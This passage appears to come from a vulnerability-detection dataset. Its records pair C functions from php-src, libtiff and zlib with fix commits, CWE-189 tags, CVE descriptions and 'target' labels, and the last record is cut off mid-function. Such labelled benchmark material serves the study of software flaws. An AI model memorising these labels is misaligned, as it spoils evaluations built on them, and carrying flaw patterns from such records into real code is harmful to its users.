"https://nvd.nist.gov/vuln/detail/CVE-2016-2070"}
{"idx": 160456, "project": "php-src", "commit_id": "1cda0d7c2ffb62d8331c64e703131d9cabdc03ea", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/1cda0d7c2ffb62d8331c64e703131d9cabdc03ea", "commit_message": "Fix bug #73737 FPE when parsing a tag format", "target": 0, "func": "static size_t exif_convert_any_to_int(void *value, int format, int motorola_intel TSRMLS_DC)\n{\n\tint \t\ts_den;\n\tunsigned \tu_den;\n\n\tswitch(format) {\n\t\tcase TAG_FMT_SBYTE:     return *(signed char *)value;\n\t\tcase TAG_FMT_BYTE:      return *(uchar *)value;\n\n\t\tcase TAG_FMT_USHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_ULONG:     return php_ifd_get32u(value, motorola_intel);\n\n\t\tcase TAG_FMT_URATIONAL:\n\t\t\tu_den = php_ifd_get32u(4+(char *)value, motorola_intel);\n\t\t\tif (u_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn php_ifd_get32u(value, motorola_intel) / u_den;\n\t\t\t}\n\n\t\tcase TAG_FMT_SRATIONAL:\n\t\t\ts_den = php_ifd_get32s(4+(char *)value, motorola_intel);\n \t\t\tif (s_den == 0) {\n \t\t\t\treturn 0;\n \t\t\t} else {\n\t\t\t\treturn (size_t)((double)php_ifd_get32s(value, motorola_intel) / s_den);\n \t\t\t}\n \n \t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_SLONG:     return php_ifd_get32s(value, motorola_intel);\n\n\t\t/* Not sure if this is correct (never seen float used in Exif format) */\n\t\tcase TAG_FMT_SINGLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type single\");\n#endif\n\t\t\treturn (size_t)*(float *)value;\n\t\tcase TAG_FMT_DOUBLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type double\");\n#endif\n\t\t\treturn (size_t)*(double *)value;\n\t}\n\treturn 0;\n}\n", "func_hash": 167339613556723135733256636978336421524, "file_name": "exif.c", "file_hash": 234617860043523413384382271217659874527, "cwe": ["CWE-189"], "cve": "CVE-2016-10158", "cve_desc": "The exif_convert_any_to_int function in ext/exif/exif.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (application crash) via crafted EXIF data that triggers an attempt to divide the minimum representable negative integer by -1.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10158"}
{"idx": 160467, "project": "libtiff", "commit_id": "c7153361a4041260719b340f73f2f76", "project_url": "https://github.com/vadz/libtiff", "commit_url": "https://github.com/vadz/libtiff/commit/c7153361a4041260719b340f73f2f76", "commit_message": "* tools/tiff2pdf.c: avoid potential heap-based overflow in\nt2p_readwrite_pdf_image_tile().\nFixes http://bugzilla.maptools.org/show_bug.cgi?id=2640", "target": 0, "func": "tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_t tile){\n\n\tuint16 edge=0;\n\ttsize_t written=0;\n\tunsigned char* buffer=NULL;\n\ttsize_t bufferoffset=0;\n\tunsigned char* samplebuffer=NULL;\n\ttsize_t samplebufferoffset=0;\n\ttsize_t read=0;\n\tuint16 i=0;\n\tttile_t tilecount=0;\n\t/* tsize_t tilesize=0; */\n\tttile_t septilecount=0;\n\ttsize_t septilesize=0;\n#ifdef JPEG_SUPPORT\n\tunsigned char* jpt;\n\tfloat* xfloatp;\n\tuint32 xuint32=0;\n#endif\n\n\t/* Fail if prior error (in particular, can't trust tiff_datasize) */\n\tif (t2p->t2p_error != T2P_ERR_OK)\n\t\treturn(0);\n\n\tedge |= t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\tedge |= t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\n\tif( (t2p->pdf_transcode == T2P_TRANSCODE_RAW) && ((edge == 0)\n#if defined(JPEG_SUPPORT) || defined(OJPEG_SUPPORT)\n\t\t|| (t2p->pdf_compression == T2P_COMPRESS_JPEG)\n#endif\n\t)\n\t){\n#ifdef CCITT_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_G4){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef ZIP_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_ZIP){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef OJPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_OJPEG){\n\t\t\tif(! t2p->pdf_ojpegdata){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"No support for OJPEG image %s with \"\n                                        \"bad tables\", \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tbuffer=(unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\t_TIFFmemcpy(buffer, t2p->pdf_ojpegdata, t2p->pdf_ojpegdatalength);\n\t\t\tif(edge!=0){\n\t\t\t\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[7]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength >> 8) & 0xff;\n\t\t\t\t\tbuffer[8]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength ) & 0xff;\n\t\t\t\t}\n\t\t\t\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[9]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth >> 8) & 0xff;\n\t\t\t\t\tbuffer[10]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth ) & 0xff;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbufferoffset=t2p->pdf_ojpegdatalength;\n\t\t\tbufferoffset+=TIFFReadRawTile(input, \n\t\t\t\t\ttile, \n\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t-1);\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xff;\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xd9;\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n#ifdef JPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_JPEG){\n\t\t\tunsigned char table_end[2];\n\t\t\tuint32 count = 0;\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate \" TIFF_SIZE_FORMAT \" bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n                                          (TIFF_SIZE_T) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n \t\t\t\treturn(0);\n \t\t\t}\n \t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n\t\t\t\tif (count > 4) {\n                                         int retTIFFReadRawTile;\n                     /* Ignore EOI marker of JpegTables */\n \t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n\t\t\t\t\tbufferoffset += count - 2;\n                    /* Store last 2 bytes of the JpegTables */\n\t\t\t\t\ttable_end[0] = buffer[bufferoffset-2];\n\t\t\t\t\ttable_end[1] = buffer[bufferoffset-1];\n\t\t\t\t\txuint32 = bufferoffset;\n                                        bufferoffset -= 2;\n                                        retTIFFReadRawTile= TIFFReadRawTile(\n\t\t\t\t\t\tinput, \n\t\t\t\t\t\ttile, \n\t\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t\t-1);\n                                        if( retTIFFReadRawTile < 0 )\n                                        {\n                                            _TIFFfree(buffer);\n                                            t2p->t2p_error = T2P_ERR_ERROR;\n                                            return(0);\n                                        }\n\t\t\t\t\tbufferoffset += retTIFFReadRawTile;\n                    /* Overwrite SOI marker of image scan with previously */\n                    /* saved end of JpegTables */\n\t\t\t\t\tbuffer[xuint32-2]=table_end[0];\n\t\t\t\t\tbuffer[xuint32-1]=table_end[1];\n\t\t\t\t}\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n\t\t(void)0;\n\t}\n\n\tif(t2p->pdf_sample==T2P_SAMPLE_NOTHING){\n\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\tif(buffer==NULL){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Can't allocate %lu bytes of memory for \"\n                                \"t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\tTIFFFileName(input));\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tread = TIFFReadEncodedTile(\n\t\t\tinput, \n\t\t\ttile, \n\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\tt2p->tiff_datasize);\n\t\tif(read==-1){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\ttile, \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t} else {\n\n\t\tif(t2p->pdf_sample == T2P_SAMPLE_PLANAR_SEPARATE_TO_CONTIG){\n\t\t\tseptilesize=TIFFTileSize(input);\n\t\t\tseptilecount=TIFFNumberOfTiles(input);\n\t\t\t/* tilesize=septilesize*t2p->tiff_samplesperpixel; */\n\t\t\ttilecount=septilecount/t2p->tiff_samplesperpixel;\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(samplebuffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebufferoffset=0;\n\t\t\tfor(i=0;i<t2p->tiff_samplesperpixel;i++){\n\t\t\t\tread = \n\t\t\t\t\tTIFFReadEncodedTile(input, \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\t(tdata_t) &(samplebuffer[samplebufferoffset]), \n\t\t\t\t\t\tseptilesize);\n\t\t\t\tif(read==-1){\n\t\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t\t\t_TIFFfree(samplebuffer);\n\t\t\t\t\t\t_TIFFfree(buffer);\n\t\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\t\treturn(0);\n\t\t\t\t}\n\t\t\t\tsamplebufferoffset+=read;\n\t\t\t}\n\t\t\tt2p_sample_planar_separate_to_contig(\n\t\t\t\tt2p,\n\t\t\t\t&(buffer[bufferoffset]),\n\t\t\t\tsamplebuffer, \n\t\t\t\tsamplebufferoffset); \n\t\t\tbufferoffset+=samplebufferoffset;\n\t\t\t_TIFFfree(samplebuffer);\n\t\t}\n\n\t\tif(buffer==NULL){\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tread = TIFFReadEncodedTile(\n\t\t\t\tinput, \n\t\t\t\ttile, \n\t\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\t\tt2p->tiff_datasize);\n\t\t\tif(read==-1){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\ttile, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t_TIFFfree(buffer);\n\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgba_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBAA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgbaa_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_YCBCR_TO_RGB){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"No support for YCbCr to RGB in tile for %s\", \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_LAB_SIGNED_TO_UNSIGNED){\n\t\t\tt2p->tiff_datasize=t2p_sample_lab_signed_to_unsigned(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\t}\n\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) != 0){\n\t\tt2p_tile_collapse_left(\n\t\t\tbuffer, \n\t\t\tTIFFTileRowSize(input),\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth,\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t}\n\n\n\tt2p_disable(output);\n\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, t2p->tiff_photometric);\n\tTIFFSetField(output, TIFFTAG_BITSPERSAMPLE, t2p->tiff_bitspersample);\n\tTIFFSetField(output, TIFFTAG_SAMPLESPERPIXEL, t2p->tiff_samplesperpixel);\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth);\n\t}\n\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t}\n\tTIFFSetField(output, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\n\tTIFFSetField(output, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB);\n\n\tswitch(t2p->pdf_compression){\n\tcase T2P_COMPRESS_NONE:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_NONE);\n\t\tbreak;\n#ifdef CCITT_SUPPORT\n\tcase T2P_COMPRESS_G4:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);\n\t\tbreak;\n#endif\n#ifdef JPEG_SUPPORT\n\tcase T2P_COMPRESS_JPEG:\n\t\tif (t2p->tiff_photometric==PHOTOMETRIC_YCBCR) {\n\t\t\tuint16 hor = 0, ver = 0;\n\t\t\tif (TIFFGetField(input, TIFFTAG_YCBCRSUBSAMPLING, &hor, &ver)!=0) {\n\t\t\t\tif (hor != 0 && ver != 0) {\n\t\t\t\t\tTIFFSetField(output, TIFFTAG_YCBCRSUBSAMPLING, hor, ver);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_REFERENCEBLACKWHITE, &xfloatp)!=0){\n\t\t\t\tTIFFSetField(output, TIFFTAG_REFERENCEBLACKWHITE, xfloatp);\n\t\t\t}\n\t\t}\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_JPEG);\n\t\tTIFFSetField(output, TIFFTAG_JPEGTABLESMODE, 0); /* JPEGTABLESMODE_NONE */\n\t\tif(t2p->pdf_colorspace & (T2P_CS_RGB | T2P_CS_LAB)){\n\t\t\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_YCBCR);\n\t\t\tif(t2p->tiff_photometric != PHOTOMETRIC_YCBCR){\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RGB);\n\t\t\t} else {\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RAW);\n\t\t\t}\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_GRAY){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_CMYK){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_JPEGQUALITY, \n\t\t\t\tt2p->pdf_defaultcompressionquality);\n\t\t}\n\t\tbreak;\n#endif\n#ifdef ZIP_SUPPORT\n\tcase T2P_COMPRESS_ZIP:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_DEFLATE);\n\t\tif(t2p->pdf_defaultcompressionquality%100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_PREDICTOR, \n\t\t\t\tt2p->pdf_defaultcompressionquality % 100);\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality/100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_ZIPQUALITY, \n\t\t\t\t(t2p->pdf_defaultcompressionquality / 100));\n\t\t}\n\t\tbreak;\n#endif\n\tdefault:\n\t\tbreak;\n\t}\n\n\tt2p_enable(output);\n\tt2p->outputwritten = 0;\n\tbufferoffset = TIFFWriteEncodedStrip(output, (tstrip_t) 0, buffer,\n\t\t\t\t\t     TIFFStripSize(output)); \n\tif (buffer != NULL) {\n\t\t_TIFFfree(buffer);\n\t\tbuffer = NULL;\n\t}\n\tif (bufferoffset == -1) {\n\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t  \"Error writing encoded tile to output PDF %s\", \n\t\t\t  TIFFFileName(output));\n\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\treturn(0);\n\t}\n\t\n\twritten = t2p->outputwritten;\n\t\n\treturn(written);\n}\n", "func_hash": 42551173115675013096612302724416268458, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-10094", "cve_desc": "Off-by-one error in the t2p_readwrite_pdf_image_tile function in tools/tiff2pdf.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10094"}
{"idx": 160572, "project": "zlib", "commit_id": "d1d577490c15a0c6862473d7576352a9f18ef811", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/d1d577490c15a0c6862473d7576352a9f18ef811", "commit_message": "Avoid pre-decrement of pointer in big-endian CRC calculation.\n\nThere was a small optimization for PowerPCs to pre-increment a\npointer when accessing a word, instead of post-incrementing. This\nrequired prefacing the loop with a decrement of the pointer,\npossibly pointing before the object passed. This is not compliant\nwith the C standard, for which decrementing a pointer before its\nallocated memory is undefined. When tested on a modern PowerPC\nwith a modern compiler, the optimization no longer has any effect.\nDue to all that, and per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.", "target": 0, "func": "local unsigned long crc32_big(crc, buf, len)\n    unsigned long crc;\n    const unsigned char FAR *buf;\n    unsigned len;\n{\n    register z_crc_t c;\n    register const z_crc_t FAR *buf4;\n\n    c = ZSWAP32((z_crc_t)crc);\n    c = ~c;\n    while (len && ((ptrdiff_t)buf & 3)) {\n        c = crc_table[4][(c >> 24) ^ *buf++] ^ (c << 8);\n        len--;\n     }\n \n     buf4 = (const z_crc_t FAR *)(const void FAR *)buf;\n     while (len >= 32) {\n         DOBIG32;\n         len -= 32;\n    }\n    while (len >= 4) {\n         DOBIG4;\n         len -= 4;\n     }\n     buf = (const unsigned char FAR *)buf4;\n \n     if (len) do {\n        c = crc_table[4][(c >> 24) ^ *buf++] ^ (c << 8);\n    } while (--len);\n    c = ~c;\n    return (unsigned long)(ZSWAP32(c));\n}\n", "func_hash": 256731203865202003796516786678894937159, "file_name": "crc32.c", "file_hash": 233003446608341810855222203282721093717, "cwe": ["CWE-189"], "cve": "CVE-2016-9843", "cve_desc": "The crc32_big function in crc32.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving big-endian CRC calculation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9843"}
{"idx": 160573, "project": "zlib", "commit_id": "e54e1299404101a5a9d0cf5e45512b543967f958", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/e54e1299404101a5a9d0cf5e45512b543967f958", "commit_message": "Avoid shifts of negative values inflateMark().\n\nThe C standard says that bit shifts of negative integers is\nundefined.  This casts to unsigned values to assure a known\nresult.", "target": 0, "func": "long ZEXPORT inflateMark(strm)\nz_streamp strm;\n {\n     struct inflate_state FAR *state;\n \n    if (strm == Z_NULL || strm->state == Z_NULL)\n        return (long)(((unsigned long)0 - 1) << 16);\n     state = (struct inflate_state FAR *)strm->state;\n    return (long)(((unsigned long)((long)state->back)) << 16) +\n         (state->mode == COPY ? state->length :\n             (state->mode == MATCH ? state->was - state->length : 0));\n }\n", "func_hash": 277856133545947640882307196932147570148, "file_name": "inflate.c", "file_hash": 118291032335358851693705705041332712538, "cwe": ["CWE-189"], "cve": "CVE-2016-9842", "cve_desc": "The inflateMark function in inflate.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving left shifts of negative integers.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9842"}
{"idx": 160574, "project": "zlib", "commit_id": "9aaec95e82117c1cb0f9624264c3618fc380cecb", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/9aaec95e82117c1cb0f9624264c3618fc380cecb", "commit_message": "Use post-increment only in inffast.c.\n\nAn old inffast.c optimization turns out to not be optimal anymore\nwith modern compilers, and furthermore was not compliant with the\nC standard, for which decrementing a pointer before its allocated\nmemory is undefined. Per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.", "target": 0, "func": "void ZLIB_INTERNAL inflate_fast(strm, start)\nz_streamp strm;\nunsigned start;         /* inflate()'s starting value for strm->avail_out */\n{\n    struct inflate_state FAR *state;\n    z_const unsigned char FAR *in;      /* local strm->next_in */\n    z_const unsigned char FAR *last;    /* have enough input while in < last */\n    unsigned char FAR *out;     /* local strm->next_out */\n    unsigned char FAR *beg;     /* inflate()'s initial strm->next_out */\n    unsigned char FAR *end;     /* while out < end, enough space available */\n#ifdef INFLATE_STRICT\n    unsigned dmax;              /* maximum distance from zlib header */\n#endif\n    unsigned wsize;             /* window size or zero if not using window */\n    unsigned whave;             /* valid bytes in the window */\n    unsigned wnext;             /* window write index */\n    unsigned char FAR *window;  /* allocated sliding window, if wsize != 0 */\n    unsigned long hold;         /* local strm->hold */\n    unsigned bits;              /* local strm->bits */\n    code const FAR *lcode;      /* local strm->lencode */\n    code const FAR *dcode;      /* local strm->distcode */\n    unsigned lmask;             /* mask for first level of length codes */\n    unsigned dmask;             /* mask for first level of distance codes */\n    code here;                  /* retrieved table entry */\n    unsigned op;                /* code bits, operation, extra bits, or */\n                                /*  window position, window bytes to copy */\n    unsigned len;               /* match length, unused bytes */\n    unsigned dist;              /* match distance */\n    unsigned char FAR *from;    /* where to copy match from */\n \n     /* copy state to local variables */\n     state = (struct inflate_state FAR *)strm->state;\n    in = strm->next_in;\n     last = in + (strm->avail_in - 5);\n    out = strm->next_out;\n     beg = out - (start - strm->avail_out);\n     end = out + (strm->avail_out - 257);\n #ifdef INFLATE_STRICT\n    dmax = state->dmax;\n#endif\n    wsize = state->wsize;\n    whave = state->whave;\n    wnext = state->wnext;\n    window = state->window;\n    hold = state->hold;\n    bits = state->bits;\n    lcode = state->lencode;\n    dcode = state->distcode;\n    lmask = (1U << state->lenbits) - 1;\n    dmask = (1U << state->distbits) - 1;\n\n    /* decode 